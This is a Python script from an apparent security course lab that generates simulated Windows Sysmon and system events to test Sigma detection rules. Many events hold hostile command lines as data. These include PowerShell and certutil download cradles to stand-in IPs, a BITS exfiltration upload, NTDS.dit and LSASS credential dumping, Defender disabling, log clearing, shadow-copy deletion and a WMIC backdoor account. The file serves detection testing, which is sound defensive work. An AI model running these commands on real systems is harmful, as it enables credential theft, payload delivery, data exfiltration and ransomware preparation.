#!/usr/bin/env python3
"""
generate_test_events.py - Genera eventos de prueba para validar reglas Sigma
Curso MAR404 - Clase 9 - Lab 18

Este script genera un dataset extenso de eventos Windows simulados que pueden
ser usados para probar reglas Sigma. Incluye tanto eventos maliciosos (que
deben disparar alertas) como eventos benignos (falsos positivos que NO deben
disparar alertas).
"""
import json
import os
import sys
import random
import string
from datetime import datetime, timedelta

BASE_TIME = datetime(2025, 7, 20, 9, 0, 0)


def random_time_offset():
    return timedelta(minutes=random.randint(0, 480), seconds=random.randint(0, 59))


def generate_events():
    """Genera todos los eventos del dataset."""
    events = []
    eid = 1

    # =========================================================================
    # CATEGORÍA 1: CREDENTIAL ACCESS (T1003)
    # =========================================================================

    # Mimikatz - acceso a LSASS (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 10, "Category": "process_access",
        "SourceImage": r"C:\Users\admin\Downloads\m.exe",
        "TargetImage": r"C:\Windows\System32\lsass.exe",
        "GrantedAccess": "0x1010",
        "SourceProcessId": 5544, "TargetProcessId": 672,
        "should_trigger": "example_mimikatz",
        "description": "Mimikatz accessing LSASS memory"
    })
    eid += 1

    # Mimikatz renamed - acceso a LSASS (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 10, "Category": "process_access",
        "SourceImage": r"C:\Windows\Temp\svchost.exe",
        "TargetImage": r"C:\Windows\System32\lsass.exe",
        "GrantedAccess": "0x1038",
        "SourceProcessId": 7788, "TargetProcessId": 672,
        "should_trigger": "example_mimikatz",
        "description": "Renamed Mimikatz (masquerading as svchost) accessing LSASS"
    })
    eid += 1

    # procdump acceso a LSASS (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 10, "Category": "process_access",
        "SourceImage": r"C:\Users\admin\procdump64.exe",
        "TargetImage": r"C:\Windows\System32\lsass.exe",
        "GrantedAccess": "0x1410",
        "SourceProcessId": 8900, "TargetProcessId": 672,
        "should_trigger": "example_mimikatz",
        "description": "Procdump accessing LSASS for credential dump"
    })
    eid += 1

    # Task Manager acceso a LSASS (FALSE POSITIVE - NO debe alertar)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 10, "Category": "process_access",
        "SourceImage": r"C:\Windows\System32\taskmgr.exe",
        "TargetImage": r"C:\Windows\System32\lsass.exe",
        "GrantedAccess": "0x1010",
        "SourceProcessId": 3300, "TargetProcessId": 672,
        "should_trigger": "NONE_FP",
        "description": "FP: Task Manager legitimately accessing LSASS"
    })
    eid += 1

    # ntdsutil (DEBE ALERTAR - ntdsutil_credential)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\ntdsutil.exe",
        "CommandLine": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "ntdsutil_credential",
        "description": "NTDS.dit extraction via ntdsutil"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 2: EXECUTION - PowerShell (T1059.001)
    # =========================================================================

    # PowerShell encoded (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADEAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\user01",
        "should_trigger": "powershell_encoded",
        "description": "PowerShell with encoded command downloading payload"
    })
    eid += 1

    # PowerShell IEX cradle (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell.exe -nop -w hidden -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
        "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "User": "CORP\\user02",
        "should_trigger": "powershell_encoded",
        "description": "PowerShell encoded launched from Word (macro execution)"
    })
    eid += 1

    # PowerShell legítimo (FALSE POSITIVE)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell.exe Get-Process | Sort-Object CPU -Descending",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "NONE_FP",
        "description": "FP: Legitimate PowerShell admin command"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 3: DEFENSE EVASION - LOLBins (T1218)
    # =========================================================================

    # certutil download (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": "certutil -urlcache -split -f http://198.51.100.10/beacon.exe C:\\Temp\\update.exe",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\user01",
        "should_trigger": "certutil_download",
        "description": "Certutil downloading malicious beacon"
    })
    eid += 1

    # certutil legítimo (FALSE POSITIVE)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": "certutil -verify -urlfetch C:\\certs\\server.crt",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "NONE_FP",
        "description": "FP: Legitimate certutil certificate verification"
    })
    eid += 1

    # mshta remote HTA (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\mshta.exe",
        "CommandLine": "mshta.exe http://198.51.100.10/payload.hta",
        "ParentImage": r"C:\Windows\explorer.exe",
        "User": "CORP\\user01",
        "should_trigger": "mshta_execution",
        "description": "MSHTA executing remote HTA file"
    })
    eid += 1

    # mshta inline vbscript (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\mshta.exe",
        "CommandLine": 'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc JAB..."", 0:close")',
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\user02",
        "should_trigger": "mshta_execution",
        "description": "MSHTA executing inline VBScript to launch PowerShell"
    })
    eid += 1

    # bitsadmin download (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\bitsadmin.exe",
        "CommandLine": "bitsadmin /transfer myJob /download /priority high http://203.0.113.50/implant.exe C:\\Users\\Public\\updater.exe",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\user01",
        "should_trigger": "bitsadmin_download",
        "description": "BITSAdmin downloading malicious implant"
    })
    eid += 1

    # rundll32 suspicious DLL (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\rundll32.exe",
        "CommandLine": r"rundll32.exe C:\Users\admin\AppData\Local\Temp\malicious.dll,DllMain",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\user01",
        "should_trigger": "rundll32_suspicious",
        "description": "Rundll32 loading DLL from Temp directory"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 4: PERSISTENCE (T1053, T1547, T1543)
    # =========================================================================

    # schtasks persistence (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\schtasks.exe",
        "CommandLine": r"schtasks /create /tn WindowsUpdate /tr C:\Users\Public\svchost.exe /sc hourly /ru SYSTEM",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\user01",
        "should_trigger": "schtasks_persistence",
        "description": "Scheduled task created pointing to suspicious binary"
    })
    eid += 1

    # schtasks from AppData (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\schtasks.exe",
        "CommandLine": r"schtasks /create /tn ChromeUpdate /tr C:\Users\user01\AppData\Roaming\chrome_update.exe /sc onlogon",
        "ParentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "User": "CORP\\user01",
        "should_trigger": "schtasks_persistence",
        "description": "Scheduled task from AppData via PowerShell"
    })
    eid += 1

    # Service from temp (DEBE ALERTAR - EventID 7045)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 7045, "Category": "system",
        "ServiceName": "WindowsUpdateSvc",
        "ImagePath": r"C:\Windows\Temp\svc_update.exe",
        "ServiceType": "user mode service",
        "StartType": "auto start",
        "AccountName": "LocalSystem",
        "should_trigger": "service_from_temp",
        "description": "Malicious service installed from Temp directory"
    })
    eid += 1

    # Service from ProgramData (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 7045, "Category": "system",
        "ServiceName": "HealthMonitor",
        "ImagePath": r"C:\ProgramData\health_check.exe",
        "ServiceType": "user mode service",
        "StartType": "auto start",
        "AccountName": "LocalSystem",
        "should_trigger": "service_from_temp",
        "description": "Suspicious service from ProgramData"
    })
    eid += 1

    # Legitimate service (FALSE POSITIVE)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 7045, "Category": "system",
        "ServiceName": "MsMpSvc",
        "ImagePath": r"C:\Program Files\Windows Defender\MsMpEng.exe",
        "ServiceType": "user mode service",
        "StartType": "auto start",
        "AccountName": "LocalSystem",
        "should_trigger": "NONE_FP",
        "description": "FP: Legitimate Windows Defender service"
    })
    eid += 1

    # Registry Run key (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\reg.exe",
        "CommandLine": r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Users\Public\svchost.exe" /f',
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\user01",
        "should_trigger": "registry_run_persistence",
        "description": "Registry Run key persistence via reg.exe"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 5: LATERAL MOVEMENT (T1047, T1021)
    # =========================================================================

    # WMI remote execution (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\wbem\WMIC.exe",
        "CommandLine": 'WMIC /node:"10.0.1.100" process call create "cmd.exe /c C:\\Windows\\Temp\\beacon.exe"',
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "wmi_lateral_movement",
        "description": "WMI remote process creation for lateral movement"
    })
    eid += 1

    # PsExec (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Users\admin\Tools\PsExec64.exe",
        "CommandLine": r"PsExec64.exe \\DC01 -u admin -p P@ssw0rd cmd.exe /c whoami",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "psexec_lateral",
        "description": "PsExec lateral movement to domain controller"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 6: COMMAND AND CONTROL - DNS (T1071.004)
    # =========================================================================

    # DNS to suspicious TLD (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 22, "Category": "dns_query",
        "QueryName": "update-service.xyz",
        "Image": r"C:\Windows\System32\svchost.exe",
        "ProcessId": 7788,
        "should_trigger": "dns_suspicious_tld",
        "description": "DNS query to .xyz TLD (suspicious)"
    })
    eid += 1

    # DNS to known bad domain (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 22, "Category": "dns_query",
        "QueryName": "cdn-static.evil-corp.net",
        "Image": r"C:\Users\Public\svchost.exe",
        "ProcessId": 7788,
        "should_trigger": "dns_suspicious_tld",
        "description": "DNS query to known malicious domain"
    })
    eid += 1

    # DNS DGA-like domains (DEBE ALERTAR)
    for i in range(5):
        dga_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '.top'
        events.append({
            "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
            "EventID": 22, "Category": "dns_query",
            "QueryName": dga_name,
            "Image": r"C:\Windows\System32\svchost.exe",
            "ProcessId": 7788,
            "should_trigger": "dns_suspicious_tld",
            "description": f"DNS query to DGA-like domain ({dga_name})"
        })
        eid += 1

    # DNS legítimo (FALSE POSITIVE)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 22, "Category": "dns_query",
        "QueryName": "www.google.com",
        "Image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        "ProcessId": 4400,
        "should_trigger": "NONE_FP",
        "description": "FP: Legitimate DNS query to Google"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 7: IMPACT - Ransomware (T1490)
    # =========================================================================

    # vssadmin delete shadows (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\vssadmin.exe",
        "CommandLine": "vssadmin.exe delete shadows /all /quiet",
        "ParentImage": r"C:\Users\Public\locker.exe",
        "User": "SYSTEM",
        "should_trigger": "ransomware_shadow_delete",
        "description": "Shadow copy deletion - ransomware pre-encryption"
    })
    eid += 1

    # WMIC shadow delete (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\wbem\WMIC.exe",
        "CommandLine": "wmic shadowcopy delete",
        "ParentImage": r"C:\Windows\Temp\cryptor.exe",
        "User": "SYSTEM",
        "should_trigger": "ransomware_shadow_delete",
        "description": "WMIC shadow copy deletion - ransomware variant"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 8: DEFENSE EVASION (T1562, T1070)
    # =========================================================================

    # Defender disabled (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "defender_disabled",
        "description": "Windows Defender real-time protection disabled"
    })
    eid += 1

    # Defender disabled via reg (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\reg.exe",
        "CommandLine": r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "defender_disabled",
        "description": "Windows Defender disabled via registry"
    })
    eid += 1

    # wevtutil clear logs (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\wevtutil.exe",
        "CommandLine": "wevtutil cl Security",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "wevtutil_clear_logs",
        "description": "Security event log cleared - anti-forensics"
    })
    eid += 1

    # wevtutil clear System log (DEBE ALERTAR)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\wevtutil.exe",
        "CommandLine": "wevtutil clear-log System",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "wevtutil_clear_logs",
        "description": "System event log cleared"
    })
    eid += 1

    # =========================================================================
    # CATEGORÍA 9: ADDITIONAL FALSE POSITIVES (NO deben alertar)
    # =========================================================================

    # Admin PowerShell legítimo
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
        "ParentImage": r"C:\Windows\System32\schtasks.exe",
        "User": "CORP\\svc_backup",
        "should_trigger": "NONE_FP",
        "description": "FP: Legitimate backup script via scheduled task"
    })
    eid += 1

    # WMIC legítimo (sin /node:)
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\wbem\WMIC.exe",
        "CommandLine": "wmic os get caption,version",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "NONE_FP",
        "description": "FP: Legitimate WMIC local query"
    })
    eid += 1

    # schtasks legítimo
    events.append({
        "eid": eid, "timestamp": str(BASE_TIME + random_time_offset()),
        "EventID": 1, "Category": "process_creation",
        "Image": r"C:\Windows\System32\schtasks.exe",
        "CommandLine": r"schtasks /create /tn Backup /tr C:\Program Files\Backup\backup.exe /sc daily /st 02:00",
        "ParentImage": r"C:\Windows\System32\cmd.exe",
        "User": "CORP\\admin",
        "should_trigger": "NONE_FP",
        "description": "FP: Legitimate scheduled task from Program Files"
    })
    eid += 1

    return events


def generate_scenario_events(scenario_name):
    """Genera eventos para un escenario específico que se puede disparar en vivo."""
    scenarios = {
        "apt_initial_access": [
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
             "CommandLine": r"WINWORD.EXE /n C:\Users\user01\Downloads\Invoice_Q3_2025.docm",
             "ParentImage": r"C:\Windows\explorer.exe", "User": "CORP\\user01",
             "description": "User opens malicious Word document with macro"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "CommandLine": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA",
             "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
             "User": "CORP\\user01",
             "description": "Macro spawns encoded PowerShell"},
        ],
        "ransomware_attack": [
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\vssadmin.exe",
             "CommandLine": "vssadmin.exe delete shadows /all /quiet",
             "ParentImage": r"C:\Users\Public\cryptolocker.exe", "User": "SYSTEM",
             "description": "Shadow copies deleted before encryption"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\wevtutil.exe",
             "CommandLine": "wevtutil cl Security",
             "ParentImage": r"C:\Users\Public\cryptolocker.exe", "User": "SYSTEM",
             "description": "Security logs cleared to cover tracks"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "CommandLine": "powershell.exe -enc RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFMAaABhAGQAbwB3AEMAbwBwAHkA",
             "ParentImage": r"C:\Users\Public\cryptolocker.exe", "User": "SYSTEM",
             "description": "PowerShell encoded removing additional shadow copies"},
        ],
        "lateral_movement_chain": [
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Users\admin\Tools\PsExec64.exe",
             "CommandLine": r"PsExec64.exe \\FILESERVER01 -u CORP\admin -p Summer2025! cmd.exe",
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\admin",
             "description": "PsExec to file server with cleartext credentials"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\wbem\WMIC.exe",
             "CommandLine": 'WMIC /node:"10.0.1.50" process call create "cmd.exe /c net user backdoor P@ss123 /add"',
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\admin",
             "description": "WMI creating backdoor user on remote host"},
        ],
        "data_exfiltration": [
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\certutil.exe",
             "CommandLine": "certutil -urlcache -split -f http://198.51.100.10/exfil_tool.exe C:\\Temp\\tool.exe",
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\user01",
             "description": "Downloading exfiltration tool via certutil"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\bitsadmin.exe",
             "CommandLine": "bitsadmin /transfer exfil /upload /priority high https://203.0.113.50/upload C:\\Temp\\data.7z",
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\user01",
             "description": "Data exfiltration via BITS upload"},
        ],
        "defense_evasion_full": [
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableAntiSpyware $true",
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\admin",
             "description": "Disabling all Defender protections"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\wevtutil.exe",
             "CommandLine": "wevtutil cl Security",
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\admin",
             "description": "Clearing Security event log"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\wevtutil.exe",
             "CommandLine": "wevtutil clear-log Microsoft-Windows-Sysmon/Operational",
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\admin",
             "description": "Clearing Sysmon operational log"},
        ],
        "credential_theft": [
            {"EventID": 10, "Category": "process_access",
             "SourceImage": r"C:\Windows\Temp\debug.exe",
             "TargetImage": r"C:\Windows\System32\lsass.exe",
             "GrantedAccess": "0x1010", "SourceProcessId": 9900, "TargetProcessId": 672,
             "description": "Renamed tool accessing LSASS memory"},
            {"EventID": 1, "Category": "process_creation",
             "Image": r"C:\Windows\System32\ntdsutil.exe",
             "CommandLine": 'ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\ad_backup" q q',
             "ParentImage": r"C:\Windows\System32\cmd.exe", "User": "CORP\\admin",
             "description": "NTDS.dit extraction for offline cracking"},
        ],
    }

    if scenario_name == "list":
        return list(scenarios.keys())
    elif scenario_name == "all":
        all_events = []
        for name, evts in scenarios.items():
            all_events.extend(evts)
        return all_events
    elif scenario_name in scenarios:
        return scenarios[scenario_name]
    else:
        return None


def main():
    """Función principal - genera el dataset base y los escenarios."""
    events = generate_events()

    # Escribir dataset principal
    os.makedirs("/data", exist_ok=True)
    with open("/data/test_events.json", "w") as f:
        json.dump(events, f, indent=2)

    # También guardar en /app para acceso directo
    with open("/app/test_events.json", "w") as f:
        json.dump(events, f, indent=2)

    # Generar resumen
    malicious = [e for e in events if e.get("should_trigger", "") != "NONE_FP"]
    benign = [e for e in events if e.get("should_trigger", "") == "NONE_FP"]

    print(f"[+] Dataset generado: {len(events)} eventos totales")
    print(f"    - Maliciosos (deben alertar): {len(malicious)}")
    print(f"    - Benignos (NO deben alertar): {len(benign)}")
    print(f"[+] Guardado en /data/test_events.json y /app/test_events.json")

    # Generar escenarios disponibles
    scenarios = generate_scenario_events("list")
    with open("/app/scenarios.json", "w") as f:
        json.dump({"available_scenarios": scenarios}, f, indent=2)
    print(f"[+] Escenarios disponibles para trigger: {', '.join(scenarios)}")


if __name__ == "__main__":
    main()
